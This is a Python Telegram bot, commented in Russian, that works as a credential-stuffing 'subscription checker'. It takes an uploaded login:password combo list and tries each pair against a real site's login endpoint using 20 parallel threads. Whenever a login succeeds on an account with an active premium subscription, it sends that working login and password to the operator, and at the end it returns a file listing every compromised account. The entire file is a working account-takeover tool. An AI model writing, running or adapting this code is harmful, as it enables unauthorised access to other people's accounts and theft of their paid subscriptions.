
import os
import telebot
import requests
import threading
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_RAW = os.getenv("ADMIN_ID")

if not BOT_TOKEN or ":" not in str(BOT_TOKEN):
    raise ValueError("ОШИБКА: Токен не найден или указан неверно!")

try:
    ADMIN_ID = int(ADMIN_ID_RAW)
except (TypeError, ValueError):
    ADMIN_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)

# ========== МИНИ ВЕБ-СЕРВЕР ДЛЯ RENDER ==========
app = Flask(__name__)

@app.route('/')
def home():
    return "Бот работает!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

# ========== ЛОГИКА ПРОВЕРКИ АККАУНТА ==========

def check_account(login, password):
    """
    Универсальная проверка по логину и паролю.
    """
    # ⚠️ СЮДА ВПИШИ ПРЯМУЮ ССЫЛКУ ДЛЯ АВТОРИЗАЦИИ (API или POST-эндпоинт сайта)
    login_url = "https://uc.zone/login/login" 
    
    try:
        # Отправляем простой POST-запрос с логином и паролем
        payload = {
            'login': login,
            'password': password
        }
        
        response = requests.post(login_url, data=payload, timeout=10)
        response_text = response.text.lower()
        
        # 1. Проверяем, успешен ли вход (поменяй 'success' на то, что выдает сайт при успешном входе)
        if "success" in response_text or "успешная авторизация" in response_text:
            
            # 2. Ищем признаки подписки в ответе сервера
            if "premium" in response_text or "подписка активна" in response_text:
                
                # Попытка вытащить количество дней или дату (если есть цифры после слова days/дней)
                days_match = re.search(r'days\s*:\s*(\d+)', response_text)
                days_left = days_match.group(1) if days_match else "Активна"
                
                info = f"✅ **Premium** | Дней: {days_left}"
                return True, info
                
            else:
                # Если вошел, но подписки нет (нам такие в чат не нужны, но запишем как валид)
                return False, "❌ Подписки нет"
                
        # Если пароль неверный
        return False, "Невалид"

    except Exception as e:
        return False, f"Ошибка: {str(e)[:20]}"

# ========== ПАРСИНГ ФАЙЛА ==========
def parse_file(file_content):
    """Парсинг стандартного файла логин:пароль"""
    content = file_content.decode('utf-8', errors='ignore')
    lines = content.splitlines()
    items = []
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        for sep in [':', ';', '\t', '|']:
            parts = line.split(sep, 1)
            if len(parts) == 2:
                items.append({
                    'login': parts[0].strip(),
                    'password': parts[1].strip()
                })
                break
    return items

# ========== ОБРАБОТЧИКИ БОТА ==========
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "🚀 **Чекер подписок v5.0 (Fast Mode)**\n\nСкинь базу в формате:\n`логин:пароль`")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path)
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка загрузки: {e}")
        return
    
    items = parse_file(file_content)
    if not items:
        bot.reply_to(message, "❌ Не удалось найти данные. Нужен формат: логин:пароль")
        return
    
    status_msg = bot.reply_to(message, f"📊 Загружено {len(items)} строк. Запускаю поиск подписок...")
    
    valid_with_sub = []
    
    # Многопоточная проверка (20 потоков для скорости)
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_account, item['login'], item['password']): item for item in items}
        
        for i, future in enumerate(as_completed(futures), 1):
            item = futures[future]
            try:
                is_sub, info = future.result()
                
                # ЕСЛИ НАШЛИ ПОДПИСКУ — МОМЕНТАЛЬНО БЬЁМ В ЧАТ
                if is_sub:
                    valid_with_sub.append(item)
                    msg = (
                        f"🔥 **НАЙДЕНА ПОДПИСКА!** 🔥\n\n"
                        f"👤 **Логин:** `{item['login']}`\n"
                        f"🔑 **Пароль:** `{item['password']}`\n"
                        f"💎 **Статус:** {info}"
                    )
                    bot.send_message(message.chat.id, msg, parse_mode="Markdown")
            except:
                pass
            
            # Обновляем сообщение статуса раз в 50 строк
            if i % 50 == 0 or i == len(items):
                try:
                    bot.edit_message_text(
                        f"⏳ Проверено {i}/{len(items)}...\n💎 Найдено с подпиской: {len(valid_with_sub)}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
    
    # Собираем результат в файл
    bot.send_message(message.chat.id, f"🏁 Проверка завершена! Найдено подписок: {len(valid_with_sub)}")
    
    if valid_with_sub:
        valid_file = f"subs_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
        with open(valid_file, 'w', encoding='utf-8') as f:
            for v in valid_with_sub:
                f.write(f"{v['login']}:{v['password']}\n")
        
        with open(valid_file, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="✅ Список всех аккаунтов с подпиской")

# ========== ЗАПУСК СИСТЕМЫ ==========
if __name__ == "__main__":
    threading.Thread(target=run_web_server, daemon=True).start()
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
